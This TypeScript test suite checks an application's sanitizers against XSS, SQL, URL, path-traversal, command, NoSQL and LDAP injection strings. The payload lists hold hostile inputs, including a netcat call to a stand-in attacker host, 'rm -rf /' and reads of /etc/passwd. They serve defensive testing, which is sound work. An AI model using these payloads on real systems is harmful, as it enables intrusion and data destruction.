/**
 * Injection Protection Test Suite
 * Use these tests to verify your application is protected
 */

import {
  sanitizeString,
  sanitizeHTML,
  escapeSQL,
  sanitizeNoSQL,
  escapeLDAP,
  sanitizeCommand,
  sanitizePath,
} from './security'

import {
  sanitizeURL,
  sanitizeURLParams,
} from './secureLinks'

/**
 * XSS Attack Vectors - All should be blocked/sanitized
 */
export const XSS_TEST_CASES = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '<svg/onload=alert("xss")>',
  'javascript:alert("xss")',
  'data:text/html,<script>alert("xss")</script>',
  '<iframe src="javascript:alert(\'xss\')">',
  '<body onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<select onfocus=alert("xss") autofocus>',
  '<textarea onfocus=alert("xss") autofocus>',
  '<keygen onfocus=alert("xss") autofocus>',
  '<video><source onerror="alert("xss")">',
  '<audio src=x onerror=alert("xss")>',
  '<details open ontoggle=alert("xss")>',
  '<marquee onstart=alert("xss")>',
  '<<SCRIPT>alert("xss");//<</SCRIPT>',
  '<IMG SRC="javascript:alert(\'xss\');">',
  '<IMG """><SCRIPT>alert("xss")</SCRIPT>">',
  '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
  '&#60;script&#62;alert("xss")&#60;/script&#62;',
]

/**
 * SQL Injection Attack Vectors - All should be blocked
 */
export const SQL_INJECTION_TEST_CASES = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "admin' --",
  "admin' #",
  "admin'/*",
  "' or 1=1--",
  "' or 1=1#",
  "' or 1=1/*",
  "') or '1'='1--",
  "') or ('1'='1--",
  "1' UNION SELECT NULL--",
  "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' GROUP BY 1,2,--",
]

/**
 * URL Injection Attack Vectors - All should be blocked
 */
export const URL_INJECTION_TEST_CASES = [
  'javascript:alert("xss")',
  'data:text/html,<script>alert("xss")</script>',
  'vbscript:msgbox("xss")',
  'file:///etc/passwd',
  'file:///C:/Windows/System32/config/SAM',
  'about:blank',
  'blob:http://example.com',
  'filesystem:http://example.com',
  'http://localhost:8080/admin',
  'http://127.0.0.1/admin',
  'http://192.168.1.1/admin',
  'http://10.0.0.1/admin',
  'http://172.16.0.1/admin',
  'http://example.com@attacker.com',
  'http://attacker.com#@example.com',
  'http://example.com/../../../etc/passwd',
  'http://example.com/..\\..\\..\\windows\\system32',
]

/**
 * Path Traversal Attack Vectors - All should be blocked
 */
export const PATH_TRAVERSAL_TEST_CASES = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32',
  '....//....//....//etc/passwd',
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '..%252F..%252F..%252Fetc%252Fpasswd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  'file:///etc/passwd',
  '/etc/passwd',
  'C:\\Windows\\System32\\config\\SAM',
]

/**
 * Command Injection Attack Vectors - All should be blocked
 */
export const COMMAND_INJECTION_TEST_CASES = [
  '; ls -la',
  '| cat /etc/passwd',
  '& dir',
  '&& whoami',
  '|| echo hacked',
  '`whoami`',
  '$(whoami)',
  '; rm -rf /',
  '& del *.*',
  '| nc attacker.com 4444',
]

/**
 * NoSQL Injection Attack Vectors - All should be blocked
 */
export const NOSQL_INJECTION_TEST_CASES = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$regex": ".*"}',
  '{"username": {"$gt": ""}}',
  '{"username": {"$regex": "admin"}}',
  '[$ne]=1',
  '{$where: "this.password == \'password\'"}',
]

/**
 * LDAP Injection Attack Vectors - All should be blocked
 */
export const LDAP_INJECTION_TEST_CASES = [
  '*',
  '*)(&',
  '*)(uid=*))(|(uid=*',
  'admin)(|(password=*))',
  '*))(cn=*',
]

/**
 * Run all injection tests
 */
export function runInjectionTests(): {
  passed: number
  failed: number
  results: Array<{ type: string; test: string; result: 'PASS' | 'FAIL'; sanitized?: string }>
} {
  const results: Array<{ type: string; test: string; result: 'PASS' | 'FAIL'; sanitized?: string }> = []
  let passed = 0
  let failed = 0

  // Test XSS protection
  XSS_TEST_CASES.forEach((testCase) => {
    const sanitized = sanitizeString(testCase)
    const isBlocked = !sanitized.includes('<') && !sanitized.includes('script') && !sanitized.includes('javascript')
    
    results.push({
      type: 'XSS',
      test: testCase,
      result: isBlocked ? 'PASS' : 'FAIL',
      sanitized,
    })
    
    if (isBlocked) passed++
    else failed++
  })

  // Test SQL injection protection
  SQL_INJECTION_TEST_CASES.forEach((testCase) => {
    const sanitized = escapeSQL(testCase)
    const isBlocked = !sanitized.includes('--') && !sanitized.includes(';')
    
    results.push({
      type: 'SQL Injection',
      test: testCase,
      result: isBlocked ? 'PASS' : 'FAIL',
      sanitized,
    })
    
    if (isBlocked) passed++
    else failed++
  })

  // Test URL injection protection
  URL_INJECTION_TEST_CASES.forEach((testCase) => {
    const sanitized = sanitizeURL(testCase)
    const isBlocked = sanitized === null
    
    results.push({
      type: 'URL Injection',
      test: testCase,
      result: isBlocked ? 'PASS' : 'FAIL',
      sanitized: sanitized || 'BLOCKED',
    })
    
    if (isBlocked) passed++
    else failed++
  })

  // Test path traversal protection
  PATH_TRAVERSAL_TEST_CASES.forEach((testCase) => {
    const sanitized = sanitizePath(testCase)
    const isBlocked = !sanitized.includes('..') && !sanitized.includes('/etc') && !sanitized.includes('C:')
    
    results.push({
      type: 'Path Traversal',
      test: testCase,
      result: isBlocked ? 'PASS' : 'FAIL',
      sanitized,
    })
    
    if (isBlocked) passed++
    else failed++
  })

  // Test command injection protection
  COMMAND_INJECTION_TEST_CASES.forEach((testCase) => {
    const sanitized = sanitizeCommand(testCase)
    const isBlocked = !sanitized.includes(';') && !sanitized.includes('|') && !sanitized.includes('&')
    
    results.push({
      type: 'Command Injection',
      test: testCase,
      result: isBlocked ? 'PASS' : 'FAIL',
      sanitized,
    })
    
    if (isBlocked) passed++
    else failed++
  })

  return { passed, failed, results }
}

/**
 * Quick test function for development
 */
export function testInjectionProtection(): void {
  const { passed, failed, results } = runInjectionTests()
  
  console.log('\n=== Injection Protection Test Results ===')
  console.log(`Total Tests: ${passed + failed}`)
  console.log(`Passed: ${passed}`)
  console.log(`Failed: ${failed}`)
  console.log(`Success Rate: ${((passed / (passed + failed)) * 100).toFixed(2)}%\n`)
  
  // Show failed tests
  const failedTests = results.filter((r) => r.result === 'FAIL')
  if (failedTests.length > 0) {
    console.log('Failed Tests:')
    failedTests.forEach((test) => {
      console.log(`[${test.type}] ${test.test}`)
      console.log(`  Sanitized to: ${test.sanitized}\n`)
    })
  } else {
    console.log('✅ All injection protection tests passed!')
  }
}

export default {
  XSS_TEST_CASES,
  SQL_INJECTION_TEST_CASES,
  URL_INJECTION_TEST_CASES,
  PATH_TRAVERSAL_TEST_CASES,
  COMMAND_INJECTION_TEST_CASES,
  NOSQL_INJECTION_TEST_CASES,
  LDAP_INJECTION_TEST_CASES,
  runInjectionTests,
  testInjectionProtection,
}
